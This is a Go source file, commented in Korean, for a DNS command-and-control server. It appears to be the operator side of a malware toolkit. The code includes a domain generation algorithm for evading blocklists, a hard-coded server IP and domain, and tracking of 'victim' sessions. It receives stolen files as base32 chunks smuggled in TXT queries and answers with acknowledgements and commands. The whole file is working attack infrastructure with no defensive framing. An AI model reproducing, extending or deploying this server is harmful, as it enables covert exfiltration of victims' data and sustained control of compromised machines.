// main.go - 최종 완성본 (NS 처리, DGA 로직 버그 수정, 세션 관리 등 모든 기능 포함)
package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

const (
	listenAddr        = ":53"
	basePath          = "/root/dns-c2"
	logPath           = basePath + "/logs/raw/dns_query.log"
	resultPath        = basePath + "/logs/results"
	exfilSessionFile  = basePath + "/server/exfil_sessions.json"
	vpsIP             = "178.128.53.254"
	primaryNSHostname = "ns1.pintruder.com." // 네임서버 호스트명. 마지막에 . 을 꼭 붙여야 합니다.
)

// SessionState는 파일 유출 세션의 상태를 저장합니다.
type SessionState struct {
	VictimHash string    `json:"victim_hash"`
	LastChunk  int       `json:"last_chunk"`
	LastUpdate time.Time `json:"last_update"`
}

var (
	// config는 DGA 알고리즘의 설정을 정의합니다. Python 클라이언트와 동일해야 합니다.
	config = map[int]struct {
		seed  int
		shift int
		mod   int
		tlds  []string
	}{
		1: {62, 7, 8, []string{"ml", "org", "net", "com", "pw", "eu", "in", "us", "xyz", "top", "info"}},
	}
	// fixedDomain은 DGA 도메인 확인 실패 시 사용할 고정 도메인입니다.
	fixedDomain = "pintruder.com"
	// whitelistedDGADomains는 날짜와 상관없이 항상 유효하다고 처리할 DGA 도메인 목록입니다.
	whitelistedDGADomains = map[string]bool{
		"cwupjxnesdjv.top": true,
		"fximysp.xyz":      true,
	}

	sessionData  map[string]SessionState
	sessionMutex = &sync.Mutex{}
)

// loadSessions는 서버 시작 시 exfil_sessions.json 파일에서 세션 정보를 로드합니다.
func loadSessions() {
	sessionMutex.Lock()
	defer sessionMutex.Unlock()
	sessionData = make(map[string]SessionState)
	data, err := os.ReadFile(exfilSessionFile)
	if err != nil {
		if os.IsNotExist(err) {
			log.Printf("세션 파일 '%s' 없음. 새로 생성.", exfilSessionFile)
			return
		}
		log.Printf("세션 파일 읽기 실패: %v", err)
		return
	}
	if err := json.Unmarshal(data, &sessionData); err != nil {
		log.Printf("세션 파일 파싱 실패: %v", err)
	} else {
		log.Printf("%d개의 세션을 파일에서 성공적으로 로드했습니다.", len(sessionData))
	}
}

// saveSessions는 현재 세션 정보를 exfil_sessions.json 파일에 저장합니다.
func saveSessions() {
	sessionMutex.Lock()
	defer sessionMutex.Unlock()
	data, err := json.MarshalIndent(sessionData, "", "  ")
	if err != nil {
		log.Printf("세션 데이터 마샬링 실패: %v", err)
		return
	}
	if err := os.WriteFile(exfilSessionFile, data, 0644); err != nil {
		log.Printf("세션 파일 쓰기 실패: %v", err)
	}
}

// ror32와 rol32는 DGA 알고리즘에 사용되는 비트 연산 함수입니다.
func ror32(v, s uint32) uint32 { return (v >> s) | (v << (32 - s)) }
func rol32(v, s uint32) uint32 { return (v << s) | (v >> (32 - s)) }

// dga는 주어진 날짜에 맞는 도메인을 생성합니다. Python 클라이언트와 로직이 동일합니다.
func dga(date time.Time, configNr, domainNr int) string {
	c := config[configNr]
	period := date.Year()*1000 + (int(date.Month())-1)*30 + (date.Day()/21)
	t := ror32(0xB11924E1*uint32(period+0x1BF5), uint32(c.shift))
	if c.seed != 0 {
		t = ror32(0xB11924E1*(t+uint32(c.seed)+0x27100001), uint32(c.shift))
	}
	//t = ror32(0xB11924E1*(t+uint32(date.Day()/2)+0x27100001), uint32(c.shift))
	//t = ror32(0xB11924E1*(t+uint32(date.Month())+0x2709A354), uint32(c.shift))
	nr := rol32(uint32(domainNr), 21)
	s_val := rol32(uint32(c.seed), 17)
	r_val := ror32(0xB11924E1*(nr+t+s_val+0x27100001), uint32(c.shift)) + 0x27100001
	length := (r_val % 12) + 7
	domain := ""
	for i := 0; i < int(length); i++ {
		r_val = ror32(0xB11924E1*rol32(r_val, uint32(i)), uint32(c.shift)) + 0x27100001
		domain += string(rune(r_val%25 + 'a'))
	}
	domain += "."
	r_val = ror32(r_val*0xB11924E1, uint32(c.shift))
	tld_i := (r_val + 0x27100001) % uint32(len(c.tlds))
	domain += c.tlds[tld_i]
	return domain
}

func saveLog(entry string) {
	os.MkdirAll(filepath.Dir(logPath), 0755)
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("로그 저장 실패: %v", err)
		return
	}
	defer f.Close()
	f.WriteString(entry + "\n")
}

func atoi(s string) int {
	i, _ := strconv.Atoi(s)
	return i
}

func saveChunk(victim, session, idx, data string) error {
	sessionDir := filepath.Join(resultPath, victim, "session_"+session)
	os.MkdirAll(sessionDir, 0755)
	filePath := filepath.Join(sessionDir, fmt.Sprintf("chunk_%s.b64", idx))
	return os.WriteFile(filePath, []byte(data), 0644)
}

// validDomain은 요청된 도메인이 우리가 처리해야 할 유효한 도메인인지 검사합니다.
func validDomain(qname string) bool {
	parts := strings.Split(qname, ".")
	if len(parts) < 2 {
		return false
	}
	// 마지막 두 부분을 조합하여 기본 도메인을 만듭니다 (예: "example.com").
	suffix := parts[len(parts)-2] + "." + parts[len(parts)-1]

	// 1. 고정 도메인인지 확인
	if suffix == fixedDomain {
		return true
	}
	// 2. 테스트용 화이트리스트 도메인인지 확인
	if _, exists := whitelistedDGADomains[suffix]; exists {
		return true
	}
	// 3. 오늘의 DGA 리스트에 있는지 확인
	now := time.Now().UTC()
	for i := 0; i < 30; i++ {
		if suffix == dga(now, 1, i) {
			return true
		}
	}
	return false
}

// handleRequest는 모든 DNS 요청을 처리하는 메인 핸들러입니다.
func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Compress = false
	q := r.Question[0]
	qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")

	logEntry := fmt.Sprintf("%s | %s | %s | %s", time.Now().Format(time.RFC3339), w.RemoteAddr().String(), dns.TypeToString[q.Qtype], qname)
	fmt.Println(logEntry)
	saveLog(logEntry)

	if !validDomain(qname) {
		msg.SetRcode(r, dns.RcodeNameError)
		w.WriteMsg(msg)
		return
	}

	switch q.Qtype {
	case dns.TypeNS:
		msg.Answer = append(msg.Answer, &dns.NS{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 3600},
			Ns:  primaryNSHostname,
		})
	case dns.TypeA:
		msg.Answer = append(msg.Answer, &dns.A{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
			A:   net.ParseIP(vpsIP),
		})
	case dns.TypeTXT:
		parts := strings.Split(qname, ".")
		if parts[0] == "init" && len(parts) >= 4 {
			sessionID := parts[1]
			sessionMutex.Lock()
			session, exists := sessionData[sessionID]
			sessionMutex.Unlock()
			last := -1
			if exists {
				last = session.LastChunk
			}
			state := fmt.Sprintf("STATE:{\"last_chunk\":%d}", last)
			msg.Answer = append(msg.Answer, &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 1}, Txt: []string{state}})
		} else if len(parts) >= 6 && (len(parts[0]) > 0 && parts[0][0] >= '0' && parts[0][0] <= '9') {
			chunkIdxStr, chunkIdx := parts[0], atoi(parts[0])
			sessionID, victimHash := parts[3], parts[4]
			b32data := parts[1] + parts[2]
			if err := saveChunk(victimHash, sessionID, chunkIdxStr, b32data); err == nil {
				sessionMutex.Lock()
				session, exists := sessionData[sessionID]
				if !exists {
					session = SessionState{VictimHash: victimHash, LastChunk: -1}
				}
				if chunkIdx > session.LastChunk {
					session.LastChunk = chunkIdx
					session.LastUpdate = time.Now().UTC()
					sessionData[sessionID] = session
					go saveSessions()
				}
				sessionMutex.Unlock()
			}
			msg.Answer = append(msg.Answer, &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 1}, Txt: []string{fmt.Sprintf("ACK:%s|CMD:status", chunkIdxStr)}})
		} else {
			msg.SetRcode(r, dns.RcodeFormatError)
		}
	default:
		msg.SetRcode(r, dns.RcodeNotImplemented)
	}

	w.WriteMsg(msg)
}

func main() {
	log.Println("[VERSION CHECK] v6 - Final Bugfix Version ACTIVE")
	loadSessions()
	os.MkdirAll(filepath.Dir(logPath), 0755)
	dns.HandleFunc(".", handleRequest)
	udpSrv := &dns.Server{Addr: listenAddr, Net: "udp"}
	tcpSrv := &dns.Server{Addr: listenAddr, Net: "tcp"}
	log.Println("[+] UDP & TCP 서버 시작, 주소:", listenAddr)
	go func() {
		if err := udpSrv.ListenAndServe(); err != nil {
			log.Fatalf("UDP 서버 실패: %v", err)
		}
	}()
	go func() {
		if err := tcpSrv.ListenAndServe(); err != nil {
			log.Fatalf("TCP 서버 실패: %v", err)
		}
	}()
	select {}
}
